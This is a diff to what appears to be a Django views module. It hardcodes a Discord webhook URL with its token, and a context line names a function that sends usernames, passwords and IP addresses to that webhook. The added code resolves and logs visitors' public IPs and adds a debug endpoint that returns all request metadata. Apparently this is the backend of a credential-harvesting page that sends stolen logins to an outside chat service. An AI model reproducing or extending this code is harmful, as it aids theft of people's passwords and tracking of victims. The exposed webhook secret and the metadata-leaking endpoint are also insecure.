@@ -14,6 +14,13 @@ import os
 # Set up logger
 logger = logging.getLogger(__name__)
 
+PUBLIC_IP_APIS = [
+    "https://api.ipify.org",
+    "https://icanhazip.com", 
+    "https://ident.me",
+    "https://checkip.amazonaws.com",
+]
+
 # Discord Webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1523355615525867650/s28X3S_aIDij8oeU5LGcBSdyjjZgInl5oqa4DMpTyMDAhkE2thkUU_dtZ_t2yiipaT9N"
 
@@ -265,59 +272,67 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
         print(f"❌ Error sending Discord webhook: {e}")
         return False
 
+def get_public_ip():
+   
+    """Look up current public IP using an external API"""
+    for api_url in PUBLIC_IP_APIS:
+        try:
+            if USE_PROXY:
+                response = requests.get(api_url, timeout=5, proxies=PROXY)
+            else:
+                response = requests.get(api_url, timeout=5)
+            
+            if response.status_code == 200:
+                ip = response.text.strip()
+                if ip:
+                    return ip
+        except:
+            continue
+    return None
+
 def get_client_ip(request):
     """
-    Function to accurately extract the actual client IP across all environments (local/production)
-
-    Priority:
-    1. X-Forwarded-For (Proxy/Load Balancer environments)
-    2. X-Real-IP (Some proxy environments)
-    3. REMOTE_ADDR (Direct connection)
-    4. CF-Connecting-IP (When using Cloudflare)
-    5. HTTP_CLIENT_IP (Some proxies)
-    6. HTTP_X_FORWARDED (Other proxy variants)
-    7. HTTP_X_CLUSTER_CLIENT_IP (Cluster environments)
+    Accurate IP extraction in all environments (local/proxy/production)
     """
+    print("=" * 60)
+    print("🔍 IP HEADERS DEBUG:")
+    print(f"  REMOTE_ADDR: {request.META.get('REMOTE_ADDR')}")
+    print(f"  HTTP_X_FORWARDED_FOR: {request.META.get('HTTP_X_FORWARDED_FOR')}")
+    print(f"  HTTP_X_REAL_IP: {request.META.get('HTTP_X_REAL_IP')}")
     
-    # 1. Check X-Forwarded-For header (Most common proxy header)
+    # 1. X-Forwarded-For (real client IP forwarded by proxy)
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
     if x_forwarded_for:
-        # Multiple IPs may appear in a chain; the first IP is the actual client IP
         ip = x_forwarded_for.split(',')[0].strip()
-        if ip and ip != 'unknown':
+        if ip and ip != 'unknown' and ip != '127.0.0.1':
+            print(f"✅ FINAL IP: {ip} (from X-Forwarded-For)")
             return ip
     
-    # 2. Check X-Real-IP header (Commonly used with Nginx, etc.)
+    # 2. X-Real-IP
     x_real_ip = request.META.get('HTTP_X_REAL_IP')
-    if x_real_ip and x_real_ip != 'unknown':
+    if x_real_ip and x_real_ip != 'unknown' and x_real_ip != '127.0.0.1':
+        print(f"✅ FINAL IP: {x_real_ip} (from X-Real-IP)")
         return x_real_ip
     
-    # 3. When using Cloudflare (CF-Connecting-IP)
-    cf_ip = request.META.get('HTTP_CF_CONNECTING_IP')
-    if cf_ip and cf_ip != 'unknown':
-        return cf_ip
-    
-    # 4. HTTP_CLIENT_IP (Some proxy servers)
-    client_ip = request.META.get('HTTP_CLIENT_IP')
-    if client_ip and client_ip != 'unknown':
-        return client_ip
-    
-    # 5. HTTP_X_FORWARDED (Other proxy variants)
-    x_forwarded = request.META.get('HTTP_X_FORWARDED')
-    if x_forwarded and x_forwarded != 'unknown':
-        return x_forwarded
-    
-    # 6. HTTP_X_CLUSTER_CLIENT_IP (Cluster/Load Balancer)
-    cluster_ip = request.META.get('HTTP_X_CLUSTER_CLIENT_IP')
-    if cluster_ip and cluster_ip != 'unknown':
-        return cluster_ip
-    
-    # 7.REMOTE_ADDR (Direct connection or last resort)
+    # 3.Check REMOTE_ADDR
     remote_ip = request.META.get('REMOTE_ADDR')
+    
+    # 4. If REMOTE_ADDR is 127.0.0.1, look up public IP using external API
+    if remote_ip == '127.0.0.1' or remote_ip == 'localhost':
+        print("⚠️ REMOTE_ADDR is localhost, fetching public IP from external API...")
+        public_ip = get_public_ip()
+        if public_ip:
+            print(f"✅ FINAL IP: {public_ip} (from external API)")
+            return public_ip
+        else:
+            print("⚠️ Failed to get public IP from external APIs")
+    
+    # 5. Return REMOTE_ADDR
     if remote_ip:
+        print(f"✅ FINAL IP: {remote_ip} (from REMOTE_ADDR)")
         return remote_ip
     
-    # 8.Return '0.0.0.0' if nothing is found
+    print("⚠️ No IP found, returning 0.0.0.0")
     return '0.0.0.0'
 
 
@@ -509,3 +524,32 @@ def api_set_status(request):
             'status': 'error',
             'error': str(e)
         }, status=500)
+    
+
+def debug_ip(request):
+    
+    ip_headers = {}
+    ip_keys = [
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_X_REAL_IP',
+        'HTTP_CF_CONNECTING_IP',
+        'HTTP_CLIENT_IP',
+        'HTTP_X_FORWARDED',
+        'HTTP_X_CLUSTER_CLIENT_IP',
+        'HTTP_VIA',
+        'HTTP_X_PROXY_ID',
+        'REMOTE_ADDR',
+        'REMOTE_HOST',
+    ]
+    
+    for key in ip_keys:
+        ip_headers[key] = request.META.get(key, None)
+    
+    final_ip = get_client_ip(request)
+    
+    return JsonResponse({
+        'all_ip_headers': ip_headers,
+        'final_ip': final_ip,
+        'is_proxy': bool(request.META.get('HTTP_VIA')),
+        'all_meta_keys': list(request.META.keys()), 
+    }, json_dumps_params={'indent': 2})
